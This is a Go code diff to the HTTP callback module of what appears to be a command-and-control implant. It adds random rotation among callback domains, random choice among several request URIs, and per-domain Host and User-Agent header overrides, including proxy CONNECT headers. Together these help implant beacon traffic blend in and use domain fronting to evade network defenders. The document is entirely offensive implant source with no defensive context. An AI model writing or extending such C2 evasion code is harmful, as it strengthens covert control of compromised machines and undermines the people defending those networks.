@@ -48,10 +48,11 @@ type AgentVariationConfigMessage struct {
 	Name     string `json:"name" toml:"name"`
 }
 type AgentVariationConfigClient struct {
-	Headers    map[string]string                      `json:"headers" toml:"headers"`
-	Parameters map[string]string                      `json:"parameters" toml:"parameters"`
-	Message    AgentVariationConfigMessage            `json:"message" toml:"message"`
-	Transforms []AgentVariationConfigMessageTransform `json:"transforms" toml:"transforms"`
+	Headers               map[string]string                      `json:"headers" toml:"headers"`
+	Parameters            map[string]string                      `json:"parameters" toml:"parameters"`
+	DomainSpecificHeaders map[string]map[string]string           `json:"domain_specific_headers" toml:"domain_specific_headers"`
+	Message               AgentVariationConfigMessage            `json:"message" toml:"message"`
+	Transforms            []AgentVariationConfigMessageTransform `json:"transforms" toml:"transforms"`
 }
 type AgentVariationConfigServer struct {
 	Headers    map[string]string                      `json:"headers" toml:"headers"`
@@ -59,7 +60,7 @@ type AgentVariationConfigServer struct {
 }
 type AgentVariationConfig struct {
 	Verb   string                     `json:"verb" toml:"verb"`
-	URI    string                     `json:"uri" toml:"uri"`
+	URIs   []string                   `json:"uris" toml:"uris"`
 	Client AgentVariationConfigClient `json:"client" toml:"client"`
 	Server AgentVariationConfigServer `json:"server" toml:"server"`
 }
@@ -434,6 +435,8 @@ func (c *C2HTTPx) increaseErrorCount() {
 		}
 	} else if c.DomainRotationMethod == "round-robin" {
 		c.CurrentDomain = (c.CurrentDomain + 1) % len(c.CallbackDomains)
+	} else if c.DomainRotationMethod == "random" {
+		c.CurrentDomain = rand.Intn(len(c.CallbackDomains))
 	} else {
 		utils.PrintDebug(fmt.Sprintf("unknown domain rotation method: %s\n", c.DomainRotationMethod))
 	}
@@ -782,7 +785,9 @@ func (c *C2HTTPx) CreateDynamicMessage(content []byte, isGetTaskingRequest bool)
 		}
 	}
 	bodyBuffer = bytes.NewBuffer(bodyBytes)
-	url := c.CallbackDomains[c.CurrentDomain] + variation.URI
+	// select a URI from this variation at random
+	uriIndex := rand.Intn(len(variation.URIs))
+	url := c.CallbackDomains[c.CurrentDomain] + variation.URIs[uriIndex]
 	utils.PrintDebug(fmt.Sprintf("method: %s\nURL: %s\n", variation.Verb, url))
 	req, err := http.NewRequest(variation.Verb, url, bodyBuffer)
 	if err != nil {
@@ -815,6 +820,24 @@ func (c *C2HTTPx) CreateDynamicMessage(content []byte, isGetTaskingRequest bool)
 		} else {
 			req.Header.Set(key, variation.Client.Headers[key])
 		}
+	}
+	for domain, _ := range variation.Client.DomainSpecificHeaders {
+		if domain == c.CallbackDomains[c.CurrentDomain] {
+			for key, _ := range variation.Client.DomainSpecificHeaders[domain] {
+				if key == "Host" {
+					req.Host = variation.Client.DomainSpecificHeaders[domain][key]
+				} else if key == "User-Agent" {
+					req.Header.Set(key, variation.Client.DomainSpecificHeaders[domain][key])
+					tr.ProxyConnectHeader = http.Header{}
+					tr.ProxyConnectHeader.Add("User-Agent", variation.Client.DomainSpecificHeaders[domain][key])
+				} else if key == "Content-Length" {
+					continue
+				} else {
+					req.Header.Set(key, variation.Client.DomainSpecificHeaders[domain][key])
+				}
+			}
+		}
+
 	}
 	// adding query parameters is a little weird in go
 
